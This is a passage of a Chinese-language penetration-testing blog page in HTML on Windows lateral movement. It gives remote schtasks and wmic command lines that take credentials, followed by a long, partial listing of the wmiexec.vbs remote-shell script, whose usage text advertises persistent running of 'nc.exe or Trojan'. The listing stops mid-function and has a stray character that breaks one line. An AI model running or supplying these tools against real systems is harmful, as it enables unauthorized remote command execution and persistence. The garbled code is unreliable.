+<h4 id="Windows-版本-Windows-Server-2012-1"><a href="#Windows-版本-Windows-Server-2012-1" class="headerlink" title="Windows 版本 &gt;&#x3D; Windows Server 2012"></a>Windows 版本 &gt;&#x3D; Windows Server 2012</h4><h5 id="通过schtasks创建计划任务"><a href="#通过schtasks创建计划任务" class="headerlink" title="通过schtasks创建计划任务"></a>通过schtasks创建计划任务</h5><blockquote>
+<p><code>/S &lt;ip&gt;&quot;</code>：指定目标IP地址<br><code>/U &lt;username&gt;&quot;</code>：指定用户名<br><code>/P &lt;password&gt;&quot;</code>：指定密码<br><code>/TN &lt;task_name&gt;</code>：指定任务名<br><code>/TR c:\&lt;file&gt;&quot;</code>：任务执行的可执行程序<br><code>/SC</code>：定义触发时机</p>
+<blockquote>
+<p><code>/SC ONCE /ST 00:00</code>：在指定时间时执行<br><code>/SC ONSTART</code>：每次系统启动后执行<br><code>/SC ONLOGIN</code>：每次任意用户登录时执行<br><code>/SC MINUTE</code>、<code>/SC HOURLY</code>、<code>/SC DAILY</code>、<code>/SC WEEKLY</code>、<code>/SC MONTHLY</code>：每间隔一段时间就执行一次</p>
+</blockquote>
+<p><code>/F&quot;</code>：达成触发时机时，不进行回显交互，直接执行<br><code>/RU &quot;SYSTEM&quot;</code>：以系统权限执行</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /CREATE /S &lt;ip&gt; /U &lt;username&gt; /P &lt;password&gt; /TN &lt;task_name&gt; /TR c:\&lt;file&gt; /F</span><br></pre></td></tr></table></figure>
+
+<h5 id="立即执行计划任务"><a href="#立即执行计划任务" class="headerlink" title="立即执行计划任务"></a>立即执行计划任务</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /RUN /S &lt;ip&gt; /U &lt;username&gt; /P &lt;password&gt; /TN &lt;task_name&gt; /F</span><br></pre></td></tr></table></figure>
+
+<h5 id="删除计划任务"><a href="#删除计划任务" class="headerlink" title="删除计划任务"></a>删除计划任务</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /DELETE /S &lt;ip&gt; /U &lt;username&gt; /P &lt;password&gt; /TN &lt;task_name&gt; /F</span><br></pre></td></tr></table></figure>
+
+<h2 id="WMI横向移动"><a href="#WMI横向移动" class="headerlink" title="WMI横向移动"></a>WMI横向移动</h2><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><ul>
+<li>Windows原生工具</li>
+<li>无回显，不能交互</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:&lt;ip&gt; /user:&lt;username&gt; /password:&lt;password&gt; process <span class="keyword">call</span> create &quot;<span class="built_in">cmd</span>.exe /c &lt;shell&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><ul>
+<li>通过<code>wmiexec.vbs</code>实现远程命令执行</li>
+<li>需要先创建vbs脚本</li>
+<li>有回显，可以交互</li>
+</ul>
+<figure class="highlight vbs"><figcaption><span>wmiexec.vbs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="comment">&#x27;################################ Temp Result File , Change it to where you like</span></span><br><span class="line"><span class="keyword">Const</span> Path = <span class="string">&quot;C:\&quot;</span></span><br><span class="line"><span class="keyword">Const</span> FileName = <span class="string">&quot;wmi.dll&quot;</span> </span><br><span class="line"><span class="keyword">Const</span> timeOut = <span class="number">1200</span></span><br><span class="line"><span class="comment">&#x27;################################</span></span><br><span class="line">file = Path &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">file = <span class="built_in">Replace</span>(file,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">FilePath = fso.GetParentFolderName(file) <span class="comment">&#x27;for wmi create share</span></span><br><span class="line"><span class="comment">&#x27;WScript.Echo FilePath</span></span><br><span class="line"></span><br><span class="line">WAITTIME = timeOut              <span class="comment">&#x27;ms  time to execute command ,read result file after 1200ms</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objArgs = WScript.Arguments</span><br><span class="line">intArgCount = objArgs.Count a</span><br><span class="line"><span class="keyword">If</span> intArgCount &lt; <span class="number">2</span> <span class="keyword">Or</span> intArgCount &gt; <span class="number">5</span> <span class="keyword">Then</span></span><br><span class="line">    WScript.Echo </span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;                                               v1.1dev        By. Twi1ight   &quot;</span></span><br><span class="line">    WScript.Echo <span class="string">&quot; Usage:&quot;</span> &amp; _</span><br><span class="line">                    vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /shell  host  user  pass&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  command&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;wmiexec.vbs  /cmd  host  user  pass  command&quot;</span> &amp; vbNewLine &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /shell&quot;</span>  &amp; vbTab &amp; <span class="string">&quot;half-interactive shell mode&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;  /cmd&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;single command mode&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;  host&quot;</span> &amp; vbTab &amp; vbTab &amp; <span class="string">&quot;hostname or IP address&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;  command&quot;</span> &amp; vbTab &amp; <span class="string">&quot;the command to execute on remote host&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -waitTIME&quot;</span> &amp; vbTab &amp; _</span><br><span class="line">         <span class="string">&quot;[both mode] ,delay TIME to read result,&quot;</span>&amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line">         vbTab &amp; vbTab &amp;<span class="string">&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; vbTab &amp; <span class="string">&quot;  -persist&quot;</span> &amp; vbTab &amp; _</span><br><span class="line">         <span class="string">&quot;[both mode] ,running command background and persistent&quot;</span> &amp; vbNewLine &amp; vbTab &amp; _</span><br><span class="line">         vbTab &amp; vbTab &amp;<span class="string">&quot;such as nc.exe or Trojan&quot;</span> </span><br><span class="line">    WScript.Quit()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/cmd&quot;</span> <span class="keyword">And</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) &lt;&gt; <span class="string">&quot;/shell&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;</span></span><br><span class="line">    WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">boolShellMode = <span class="literal">True</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(objArgs.Item(<span class="number">0</span>)) = <span class="string">&quot;/cmd&quot;</span> <span class="keyword">Then</span> boolShellMode = <span class="literal">False</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span> command = objArgs.Item(intArgCount - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">host = objArgs.Item(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">    user = objArgs.Item(<span class="number">2</span>)</span><br><span class="line">    pass = objArgs.Item(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">    strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; &quot;&quot;&quot;</span> &amp; pass &amp; <span class="string">&quot;&quot;&quot; &quot;</span> &amp; <span class="string">&quot;/user:&quot;</span> &amp; user</span><br><span class="line">    <span class="comment">&#x27;WScript.Echo strNetUse</span></span><br><span class="line">    objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;Output Status</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Target -&gt; &quot;</span> &amp; host</span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Connecting...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objLocator = <span class="built_in">CreateObject</span>(<span class="string">&quot;wbemscripting.swbemlocator&quot;</span>)</span><br><span class="line"><span class="keyword">If</span> intArgCount &gt;<span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">set</span> objWMIService = objLocator.connectserver(host,<span class="string">&quot;root/cimv2&quot;</span>,user,pass)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    <span class="keyword">Set</span> objWMIService = objLocator.ConnectServer(host,<span class="string">&quot;root/cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">If</span> Err.Number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Description </span><br><span class="line">    WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Login -&gt; OK&quot;</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC : Result File -&gt; &quot;</span> &amp; file</span><br><span class="line"></span><br><span class="line">boolPersist = <span class="literal">False</span></span><br><span class="line"><span class="comment">&#x27;Create Share</span></span><br><span class="line">CreateShare()</span><br><span class="line">CurrentFolder = <span class="literal">Null</span></span><br><span class="line"><span class="comment">&#x27;-----single Command mode------</span></span><br><span class="line"><span class="keyword">If</span> boolShellMode = <span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">    WAITTIME = <span class="number">5000</span></span><br><span class="line">    WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; <span class="string">&quot;  &gt;&gt;  &quot;</span> &amp; command</span><br><span class="line">    boolGetFolder = <span class="literal">False</span></span><br><span class="line">    strResult = PhraseCmd( command )</span><br><span class="line">    <span class="comment">&#x27;WScript.Echo strResult</span></span><br><span class="line">    <span class="keyword">If</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">        boolPersist = <span class="literal">True</span></span><br><span class="line">        Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        Exec command, file</span><br><span class="line">        ReadResult()</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">        <span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">        strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">        objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    DeleteShare()</span><br><span class="line">    WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;++++++++shell mode++++++++++++</span></span><br><span class="line"><span class="comment">&#x27;get current working directory</span></span><br><span class="line">boolGetFolder = <span class="literal">True</span></span><br><span class="line">CurrentFolder = Exec(<span class="string">&quot;cd&quot;</span>, file)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;WScript.Echo CurrentFolder</span></span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">While</span> <span class="literal">True</span></span><br><span class="line">    boolPersist = <span class="literal">False</span></span><br><span class="line">    WAITTIME = timeOut</span><br><span class="line">    wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    command = wscript.stdin.ReadLine</span><br><span class="line">    <span class="comment">&#x27;press &#x27;Enter&#x27; directorly</span></span><br><span class="line">    <span class="keyword">Do</span> <span class="keyword">While</span> command = <span class="string">&quot;&quot;</span></span><br><span class="line">        wscript.stdout.write(CurrentFolder &amp; <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        command = wscript.stdin.ReadLine</span><br><span class="line">    <span class="keyword">Loop</span></span><br><span class="line">    <span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(command)) = <span class="string">&quot;exit&quot;</span> <span class="keyword">Then</span> <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line">    <span class="comment">&#x27;If Not IsEmpty(command) Then </span></span><br><span class="line">    <span class="comment">&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;</span></span><br><span class="line">    strResult = PhraseCmd( command )</span><br><span class="line">    <span class="keyword">If</span> strResult = <span class="string">&quot;cd&quot;</span> <span class="keyword">Then</span> </span><br><span class="line">        command = command &amp; <span class="string">&quot; &amp; cd &quot;</span></span><br><span class="line">        boolGetFolder = <span class="literal">True</span></span><br><span class="line">        DestFolder = Exec(command, file)</span><br><span class="line">        <span class="keyword">If</span> CurrentFolder = DestFolder <span class="keyword">Then</span> </span><br><span class="line">            WScript.Echo <span class="string">&quot;The system cannot find the path specified.&quot;</span></span><br><span class="line">        <span class="keyword">Else</span></span><br><span class="line">            CurrentFolder = DestFolder</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">ElseIf</span> strResult = <span class="string">&quot;persist&quot;</span> <span class="keyword">Then</span></span><br><span class="line">        boolPersist = <span class="literal">True</span></span><br><span class="line">        <span class="comment">&#x27;WScript.Echo &quot;persist&quot;</span></span><br><span class="line">        Exec command,<span class="string">&quot;nul&quot;</span></span><br><span class="line">        <span class="comment">&#x27;##########################################toDo</span></span><br><span class="line">    <span class="comment">&#x27;-----------&lt;&lt;&lt;&lt;</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">        err.clear</span><br><span class="line">        Exec command, file</span><br><span class="line">        ReadResult()</span><br><span class="line">        <span class="keyword">If</span> err.number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> wscript.echo( <span class="string">&quot;WMIEXEC ERROR: &quot;</span> &amp; Err.Number &amp; <span class="string">&quot; &quot;</span> &amp; err.description)</span><br><span class="line">        Err.Clear</span><br><span class="line">        <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Goto</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">loop</span></span><br><span class="line"></span><br><span class="line">strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">If</span> intArgCount &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">    <span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">    strNetUse = <span class="string">&quot;cmd.exe /c net use \\&quot;</span> &amp; host &amp; <span class="string">&quot; /del&quot;</span></span><br><span class="line">    objShell.Run strNetUse,<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">DeleteShare()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;#####################################</span></span><br><span class="line"><span class="keyword">Function</span> PhraseCmd(cmd)</span><br><span class="line">    PhraseCmd = <span class="literal">False</span> <span class="comment">&#x27; not &#x27;cd&#x27;</span></span><br><span class="line">    arrCommand = <span class="built_in">Split</span>(cmd)</span><br><span class="line">    strExe = arrCommand(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd&quot;</span> <span class="keyword">Or</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd.exe&quot;</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span>  <span class="comment">&#x27; is &#x27;cd&#x27;</span></span><br><span class="line">    <span class="keyword">Set</span> regEx = <span class="keyword">New</span> RegExp</span><br><span class="line">    regEx.Pattern = <span class="string">&quot;^[a-z]:$&quot;</span></span><br><span class="line">    regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">    <span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span> <span class="comment">&#x27; is &#x27;d:&#x27;</span></span><br><span class="line">    <span class="comment">&#x27;phrase time command</span></span><br><span class="line">    regEx.Pattern = <span class="string">&quot;(.*?)-wait(\d+)&quot;</span></span><br><span class="line">    regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">    <span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">        <span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">        command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line">        <span class="comment">&#x27;WScript.Echo &quot;Command :&quot; &amp; command</span></span><br><span class="line">        WAITTIME = <span class="built_in">CInt</span>(objMatch.SubMatches(<span class="number">1</span>))</span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC : Waiting &quot;</span> &amp; WAITTIME &amp; <span class="string">&quot; ms...&quot;</span> &amp; vbNewLine</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="comment">&#x27;phrase persist command</span></span><br><span class="line">    regEx.Pattern = <span class="string">&quot;(.*?)-persist&quot;</span></span><br><span class="line">    regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">    <span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">        <span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">        command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line">        PhraseCmd = <span class="string">&quot;persist&quot;</span>  <span class="comment">&#x27; is quiet</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> CreateShare()</span><br><span class="line">    <span class="comment">&#x27;create share</span></span><br><span class="line">    <span class="keyword">Set</span> objNewShare = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_Share&quot;</span>)</span><br><span class="line">    intReturn = objNewShare.Create _</span><br><span class="line">        (FilePath, <span class="string">&quot;WMI_SHARE&quot;</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share could not be created.&quot;</span> &amp; _</span><br><span class="line">            vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">        <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">            <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Invalid File Path!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">22</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC 